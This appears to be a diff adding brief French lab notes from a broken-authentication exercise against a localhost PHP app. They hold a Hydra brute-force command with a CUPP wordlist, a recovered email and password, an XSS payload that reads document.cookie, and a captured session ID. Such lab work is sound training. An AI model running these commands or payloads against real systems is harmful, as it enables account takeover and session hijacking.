@@ -1,0 +1,12 @@
+.\hydra.exe -P ..\cupp\marc.txt  -l marc.martin@gmail.com http-post-form://localhost"/tp-broken-authentication/sitesPhp/checkCredentials.php:username=^USER^&password=^PASS^:login failed"
+login: marc.martin@gmail.com   password: Martin06980
+
+<img src="zzz" onerror='console.log(document.cookie);'/>
+PHPSESSID=c3c1e5tun1dd3s3s51on
+
+OU
+
+dans application
+c3c1e5tun1dd3s3s51on
+
+CECI EST UN ID DE SESSION
